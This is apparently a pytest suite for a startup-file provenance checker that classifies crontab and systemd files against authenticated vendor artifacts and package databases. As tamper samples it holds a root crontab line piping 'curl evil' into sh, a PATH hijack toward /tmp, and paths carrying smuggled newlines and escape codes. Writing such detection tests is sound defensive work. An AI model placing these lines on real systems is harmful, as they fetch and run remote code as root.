import hashlib

import pytest

from app import startup_provenance as sp


def h(text):
    return hashlib.sha256(text.encode()).hexdigest()


def md5(text):
    return hashlib.md5(text.encode()).hexdigest()


OWNER = {'package': 'cron', 'version': '3.0pl1-184'}
DEFAULT = '0 * * * * root run-parts /etc/cron.hourly\n'


def evidence(**changes):
    base = {'path': '/etc/crontab', 'observed_sha256': h(DEFAULT),
            'ownership': {'complete': True, 'owners': [OWNER], 'diverted': False}}
    base.update(changes)
    return base


def artifact(text=DEFAULT, **changes):
    return {**OWNER, 'sha256': h(text), **changes}


def test_authenticated_exact_version_match_is_verified_default():
    result = sp.classify(evidence(authenticated_artifact=artifact()))
    assert result['provenance'] == 'verified_default' and result['verification'] == 'authenticated'
    assert result['owner'] == OWNER and result['safety'] == 'not_assessed' and not result['gaps']


def test_ownership_alone_and_package_db_match_are_not_verified():
    owned = sp.classify(evidence())
    assert owned['provenance'] == 'unverifiable' and owned['basis'] == 'package_owned'
    assert owned['gaps'][0]['code'] == 'no_authenticated_comparison'
    db = sp.classify(evidence(observed_md5=md5(DEFAULT),
                              package_db_digest={**OWNER, 'algorithm': 'md5', 'value': md5(DEFAULT)}))
    assert db['provenance'] == 'unverifiable' and db['verification'] == 'unauthenticated'
    assert db['basis'] == 'package_db_digest_match' and db['gaps'][0]['code'] == 'unauthenticated_match'


def test_package_db_md5_without_observed_md5_is_not_compared():
    result = sp.classify(evidence(package_db_digest={**OWNER, 'algorithm': 'md5', 'value': md5(DEFAULT)}))
    assert result['provenance'] == 'unverifiable' and result['basis'] == 'package_owned'
    assert [g['code'] for g in result['gaps']] == ['package_db_not_compared', 'no_authenticated_comparison']


def test_modified_from_authenticated_artifact_or_package_db():
    changed = DEFAULT + '* * * * * root /tmp/x\n'
    auth = sp.classify(evidence(observed_sha256=h(changed), authenticated_artifact=artifact()))
    assert auth['provenance'] == 'modified' and auth['verification'] == 'authenticated'
    db = sp.classify(evidence(observed_sha256=h(changed),
                              package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h(DEFAULT)}))
    assert db['provenance'] == 'modified' and db['verification'] == 'unauthenticated'


def test_artifact_for_another_version_or_package_is_not_used():
    for other in ({'version': '3.0pl1-183'}, {'package': 'cronie'}):
        result = sp.classify(evidence(authenticated_artifact=artifact(**other)))
        assert result['provenance'] == 'unverifiable'
        assert [g['code'] for g in result['gaps']] == ['artifact_mismatch', 'no_authenticated_comparison']
    db = sp.classify(evidence(package_db_digest={**OWNER, 'version': '1', 'algorithm': 'sha256', 'value': h('x')}))
    assert db['provenance'] == 'unverifiable' and db['gaps'][0]['code'] == 'package_db_mismatch'


def test_custom_needs_a_complete_ownership_query():
    custom = sp.classify(evidence(ownership={'complete': True, 'owners': [], 'diverted': False}))
    assert custom['provenance'] == 'custom' and custom['owner'] is None and custom['safety'] == 'not_assessed'
    for ownership, code in (({'complete': False, 'owners': []}, 'ownership_incomplete'),
                            (None, 'ownership_not_collected'),
                            ({'complete': True, 'owners': [OWNER], 'diverted': True}, 'diverted'),
                            ({'complete': True, 'owners': [OWNER], 'diverted': 'unknown'}, 'diverted'),
                            ({'complete': True, 'owners': [OWNER, {'package': 'b', 'version': '1'}]},
                             'multiple_owners')):
        result = sp.classify(evidence(ownership=ownership))
        assert result['provenance'] == 'unknown' and result['gaps'][0]['code'] == code


def test_transient_and_generator_sources():
    transient = sp.classify(evidence(path='/run/systemd/transient/run-1.service', source='transient'))
    assert transient['provenance'] == 'unknown' and transient['gaps'][0]['code'] == 'transient_unit'
    generated = sp.classify(evidence(path='/run/systemd/generator/x.mount', source='generator',
                                     authenticated_artifact=artifact()))
    assert generated['provenance'] == 'unverifiable' and generated['basis'] == 'generator_output'


def test_conflict_never_raises_trust():
    # Vendor bytes match, but the target's database says the file changed.
    result = sp.classify(evidence(authenticated_artifact=artifact(),
                                  package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h('other')}))
    assert result['provenance'] == 'unknown' and result['gaps'][0]['code'] == 'conflicting_evidence'


def test_rewritten_file_and_package_db_is_still_modified():
    # A target that rewrote both the file and its package database must not
    # hide the authenticated difference behind a database match.
    tampered = DEFAULT + '* * * * * root curl evil | sh\n'
    result = sp.classify(evidence(observed_sha256=h(tampered), authenticated_artifact=artifact(),
                                  package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h(tampered)}))
    assert result['provenance'] == 'modified' and result['verification'] == 'authenticated'
    assert result['basis'] == 'authenticated_artifact_differs'
    assert result['gaps'][0]['code'] == 'package_db_disagrees'


def test_entries_in_modified_file_are_classified_individually():
    defaults = [h('job-a'), h('job-b')]
    observed = [h('job-a'), h('job-added'), h('job-a')]
    result = sp.classify(evidence(observed_sha256=h('changed'), entry_sha256=observed, context_sha256=h('ctx'),
                                  authenticated_artifact=artifact(entry_sha256=defaults, context_sha256=h('ctx'))))
    assert result['provenance'] == 'modified'
    assert [e['provenance'] for e in result['entries']] == ['verified_default', 'custom', 'custom']
    assert [g['code'] for g in result['gaps']] == ['default_entries_absent']
    no_context = sp.classify(evidence(observed_sha256=h('changed'), entry_sha256=observed,
                                      authenticated_artifact=artifact(entry_sha256=defaults)))
    assert [e['provenance'] for e in no_context['entries']] == ['modified', 'custom', 'custom']
    assert [g['code'] for g in no_context['gaps']] == ['entry_context_not_compared', 'default_entries_absent']
    inherited = sp.classify(evidence(observed_sha256=h('changed'), entry_sha256=observed,
                                     authenticated_artifact=artifact()))
    assert {e['provenance'] for e in inherited['entries']} == {'modified'}
    unauth = sp.classify(evidence(observed_sha256=h('changed'), entry_sha256=observed,
                                  package_db_digest={**OWNER, 'algorithm': 'sha256', 'value': h(DEFAULT)}))
    assert {e['provenance'] for e in unauth['entries']} == {'modified'}


def test_entries_in_custom_and_unverifiable_files_inherit():
    entries = [h('job')]
    custom = sp.classify(evidence(ownership={'complete': True, 'owners': []}, entry_sha256=entries))
    assert [e['provenance'] for e in custom['entries']] == ['custom']
    owned = sp.classify(evidence(entry_sha256=entries))
    assert [e['provenance'] for e in owned['entries']] == ['unverifiable']


def test_drop_in_is_classified_separately_from_vendor_unit():
    unit = {**OWNER, 'package': 'openssh-server', 'version': '1:9.6p1-3'}
    records = sp.classify_many([
        {'path': '/usr/lib/systemd/system/ssh.service', 'observed_sha256': h('unit'),
         'ownership': {'complete': True, 'owners': [unit]},
         'authenticated_artifact': {**unit, 'sha256': h('unit')}},
        {'path': '/etc/systemd/system/ssh.service.d/override.conf', 'role': 'override', 'modifies': 'ssh.service',
         'observed_sha256': h('[Service]\nExecStart=\n'), 'ownership': {'complete': True, 'owners': []}},
    ])['records']
    assert records[0]['provenance'] == 'verified_default' and records[0]['role'] == 'file'
    assert records[1]['provenance'] == 'custom' and records[1]['modifies'] == 'ssh.service'
    missing = sp.classify(evidence(role='drop_in'))
    assert missing['provenance'] == 'unknown' and missing['gaps'][0]['code'] == 'malformed_evidence'


def test_baseline_acceptance_never_changes_class():
    accepted = {'accepted': True, 'by': 'admin', 'at': 1.0}
    custom = sp.classify(evidence(ownership={'complete': True, 'owners': []}, baseline=accepted))
    assert custom['provenance'] == 'custom'
    assert custom['baseline'] == {'accepted': True, 'affects_provenance': False, 'by': 'admin', 'at': 1.0}
    bogus = sp.classify(evidence(baseline={'accepted': 'yes'}))
    assert bogus['baseline']['accepted'] is False and bogus['gaps'][0]['code'] == 'malformed_baseline'


@pytest.mark.parametrize('changes', [
    {'path': 'relative'}, {'path': '/x\x00y'}, {'path': '/' + 'a' * 5000}, {'path': '/\ud800'},
    {'path': None}, {'observed_sha256': 'zz'}, {'observed_sha256': None},
    {'role': 'script'}, {'role': ['file']}, {'source': 'boot'}, {'source': {}},
    {'entry_sha256': ['bad']}, {'entry_sha256': [h('x')] * (sp.MAX_ENTRIES + 1)},
    {'ownership': {'complete': True, 'owners': [{'package': 'a b', 'version': '1'}]}},
    {'ownership': {'complete': True, 'owners': [OWNER] * (sp.MAX_OWNERS + 1)}},
    {'ownership': {'complete': True, 'owners': 'cron'}},
    {'authenticated_artifact': {'package': 'cron'}},
    {'authenticated_artifact': 'cron'},
    {'authenticated_artifact': artifact(entry_sha256='nope')},
    {'package_db_digest': {**OWNER, 'algorithm': 'sha1', 'value': 'a' * 40}},
    {'package_db_digest': {**OWNER, 'algorithm': ['sha256'], 'value': 'a' * 64}},
    {'package_db_digest': {**OWNER, 'algorithm': 'sha256', 'value': 'z' * 64}},
    {'package_db_digest': 'cron'},
])
def test_malformed_or_oversized_evidence_fails_closed(changes):
    result = sp.classify(evidence(**changes))
    assert result['provenance'] == 'unknown' and result['gaps'] and result['safety'] == 'not_assessed'


def test_gaps_are_bounded():
    gaps = []
    for _ in range(sp.MAX_GAPS + 5):
        sp._gap(gaps, 'x', 'y')
    assert len(gaps) == sp.MAX_GAPS + 1 and gaps[-1]['code'] == 'gaps_truncated'


def test_non_object_and_over_cap_inputs():
    assert sp.classify('x')['provenance'] == 'unknown'
    assert sp.classify_many('x')['records'] == []
    over = sp.classify_many([evidence()] * (sp.MAX_RECORDS + 1))
    assert over['records'] == [] and over['gaps'][0]['code'] == 'over_limit'


def test_every_class_is_reachable():
    seen = {sp.classify(evidence(authenticated_artifact=artifact()))['provenance'],
            sp.classify(evidence(observed_sha256=h('x'), authenticated_artifact=artifact()))['provenance'],
            sp.classify(evidence())['provenance'],
            sp.classify(evidence(ownership={'complete': True, 'owners': []}))['provenance'],
            sp.classify(evidence(ownership=None))['provenance']}
    assert seen == set(sp.CLASSES)


# Regressions for the #722 peer review (2026-11-12).
VENDOR_JOB = '17 * * * * root run-parts /etc/cron.hourly\n'


def test_context_change_outside_entries_never_yields_verified_default_entries():
    # PATH now resolves run-parts from /tmp: the job line is unchanged but its
    # effective behaviour is not, so it must not be reported as a vendor default.
    vendor, observed = 'PATH=/usr/bin\n' + VENDOR_JOB, 'PATH=/tmp:/usr/bin\n' + VENDOR_JOB
    no_context = sp.classify(evidence(observed_sha256=h(observed), entry_sha256=[h(VENDOR_JOB)],
                                      authenticated_artifact=artifact(vendor, entry_sha256=[h(VENDOR_JOB)])))
    assert no_context['provenance'] == 'modified'
    assert [e['provenance'] for e in no_context['entries']] == ['modified']
    assert no_context['entries'][0]['basis'] == 'default_entry_context_unverified'
    assert 'modified_outside_entries' in [g['code'] for g in no_context['gaps']]
    changed = sp.classify(evidence(
        observed_sha256=h(observed), entry_sha256=[h(VENDOR_JOB)], context_sha256=h('PATH=/tmp:/usr/bin\n'),
        authenticated_artifact=artifact(vendor, entry_sha256=[h(VENDOR_JOB)], context_sha256=h('PATH=/usr/bin\n'))))
    assert [e['provenance'] for e in changed['entries']] == ['modified']
    assert changed['entries'][0]['basis'] == 'default_entry_context_changed'
    assert 'modified_outside_entries' in [g['code'] for g in changed['gaps']]


def test_matching_authenticated_context_keeps_per_entry_defaults():
    context = h('PATH=/usr/bin\n')
    added = '* * * * * root /tmp/x\n'
    result = sp.classify(evidence(
        observed_sha256=h('PATH=/usr/bin\n' + VENDOR_JOB + added), context_sha256=context,
        entry_sha256=[h(VENDOR_JOB), h(added)],
        authenticated_artifact=artifact('PATH=/usr/bin\n' + VENDOR_JOB, entry_sha256=[h(VENDOR_JOB)],
                                        context_sha256=context)))
    assert [e['provenance'] for e in result['entries']] == ['verified_default', 'custom']
    assert result['entries'][0]['basis'] == 'authenticated_default_entry' and not result['gaps']


def test_missing_context_with_changed_entries_is_disclosed():
    added = '* * * * * root /tmp/x\n'
    result = sp.classify(evidence(observed_sha256=h(VENDOR_JOB + added), entry_sha256=[h(VENDOR_JOB), h(added)],
                                  authenticated_artifact=artifact(VENDOR_JOB, entry_sha256=[h(VENDOR_JOB)])))
    assert [e['provenance'] for e in result['entries']] == ['modified', 'custom']
    assert 'entry_context_not_compared' in [g['code'] for g in result['gaps']]


def test_declined_baseline_does_not_block_classification():
    declined = sp.classify(evidence(authenticated_artifact=artifact(), baseline={'accepted': False}))
    assert declined['provenance'] == 'verified_default' and not declined['gaps']
    assert declined['baseline'] == {'accepted': False, 'affects_provenance': False}
    malformed = sp.classify(evidence(authenticated_artifact=artifact(), baseline={'accepted': 'yes'}))
    assert malformed['provenance'] == 'verified_default'
    assert [g['code'] for g in malformed['gaps']] == ['malformed_baseline']


@pytest.mark.parametrize('at', [float('nan'), float('inf'), float('-inf')])
def test_non_finite_baseline_time_is_dropped(at):
    result = sp.classify(evidence(baseline={'accepted': True, 'by': 'admin', 'at': at}))
    assert result['baseline']['accepted'] is True and result['baseline']['at'] is None


@pytest.mark.parametrize('path', ['/x\n/etc/evil', '/x\r', '/x\ty', '/x\x1b[31m', '/x\x7f'])
def test_control_characters_in_path_fail_closed(path):
    result = sp.classify(evidence(path=path))
    assert result['provenance'] == 'unknown' and result['path'] is None


@pytest.mark.parametrize('changes', [
    {'context_sha256': 'zz'},
    {'authenticated_artifact': artifact(context_sha256='zz')},
])
def test_malformed_context_digest_fails_closed(changes):
    result = sp.classify(evidence(**changes))
    assert result['provenance'] == 'unknown' and result['gaps']


def test_huge_integer_baseline_time_fails_closed_without_crashing():
    result = sp.classify(evidence(baseline={'accepted': True, 'by': 'admin', 'at': 10 ** 400}))
    assert result['baseline']['at'] is None
    assert len(sp.classify_many([evidence(baseline={'accepted': True, 'at': 10 ** 400})])['records']) == 1


@pytest.mark.parametrize('path', ['/etc/cron.d/x\x85y', '/x y', '/x y', '/x\x9b31m'])
def test_c1_controls_and_unicode_line_separators_fail_closed(path):
    result = sp.classify(evidence(path=path))
    assert result['provenance'] == 'unknown' and result['path'] is None


def test_reordered_default_entries_are_not_verified():
    a, b = h('ExecStartPre=/bin/true'), h('ExecStart=/usr/sbin/sshd')
    result = sp.classify(evidence(observed_sha256=h('reordered'), entry_sha256=[b, a], context_sha256=h('ctx'),
                                  authenticated_artifact=artifact(entry_sha256=[a, b], context_sha256=h('ctx'))))
    assert [e['provenance'] for e in result['entries']] == ['modified', 'modified']
    assert {e['basis'] for e in result['entries']} == {'default_entry_order_changed'}
    assert [g['code'] for g in result['gaps']] == ['default_entries_reordered']
    # An inserted custom entry does not count as reordering the defaults.
    added = sp.classify(evidence(observed_sha256=h('added'), entry_sha256=[a, h('new'), b], context_sha256=h('ctx'),
                                 authenticated_artifact=artifact(entry_sha256=[a, b], context_sha256=h('ctx'))))
    assert [e['provenance'] for e in added['entries']] == ['verified_default', 'custom', 'verified_default']


def test_identical_entries_and_context_in_a_differing_file_disclose_the_difference():
    a = h('job')
    result = sp.classify(evidence(observed_sha256=h('job + comment'), entry_sha256=[a], context_sha256=h('ctx'),
                                  authenticated_artifact=artifact(entry_sha256=[a], context_sha256=h('ctx'))))
    assert [e['provenance'] for e in result['entries']] == ['verified_default']
    assert [g['code'] for g in result['gaps']] == ['file_differs_outside_compared_content']
